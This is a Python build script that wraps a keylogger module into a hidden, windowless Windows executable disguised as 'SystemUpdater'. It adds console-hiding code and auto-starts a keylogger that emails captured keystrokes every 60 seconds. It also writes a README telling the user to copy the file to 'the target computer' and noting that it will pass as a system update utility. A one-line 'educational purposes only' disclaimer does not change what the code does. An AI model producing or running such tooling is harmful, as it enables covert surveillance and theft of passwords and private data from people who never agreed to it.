import os
import sys
import shutil
import subprocess

def create_standalone_keylogger():
    print("Creating standalone keylogger executable...")
    
    # First, make a copy of keylogger.py with auto-start capability
    with open("keylogger.py", "r") as f:
        keylogger_code = f.read()
    
    # Create a standalone version that runs immediately
    with open("standalone_keylogger.py", "w") as f:
        f.write(keylogger_code)
        # Add code to hide console window immediately
        additional_code = """
# Auto-start code when run directly
if __name__ == "__main__":
    # Hide console window
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
        
    # Start keylogger immediately
    keylogger = KeyLogger(60, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
"""
        f.write(additional_code)
    
    # Build executable with PyInstaller
    icon_path = "app_icon.ico"
    if not os.path.exists(icon_path):
        print("Icon not found, creating default icon...")
        from PIL import Image, ImageDraw
        img = Image.new('RGBA', (256, 256), color=(255, 255, 255, 0))
        draw = ImageDraw.Draw(img)
        draw.ellipse((50, 50, 206, 206), fill=(255, 100, 100, 255))
        draw.ellipse((70, 70, 186, 186), fill=(100, 255, 100, 255))
        draw.ellipse((90, 90, 166, 166), fill=(100, 100, 255, 255))
        img.save(icon_path, format='ICO')
    
    # Create a fake application name to disguise the keylogger
    fake_name = "SystemUpdater"
    
    # PyInstaller command
    cmd = [
        "python", "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        f"--icon={icon_path}",
        f"--name={fake_name}",
        "--clean",
        "standalone_keylogger.py"
    ]
    
    try:
        subprocess.run(cmd, check=True)
        print(f"Build successful! Executable created as 'dist/{fake_name}.exe'")
        
        # Clean up temporary file
        os.remove("standalone_keylogger.py")
        
        # Create README.txt with instructions
        with open("dist/README.txt", "w") as f:
            f.write(f"""INSTRUCTIONS:
1. Copy {fake_name}.exe to the target computer
2. Run the application - it will appear as a system update utility
3. The keylogger will run in the background with no visible window
4. Logs and data will be sent to the configured email account

IMPORTANT: This is for educational purposes only. Ensure you have permission to run this software.
""")
        
    except Exception as e:
        print(f"Build failed: {e}")

if __name__ == "__main__":
    create_standalone_keylogger() 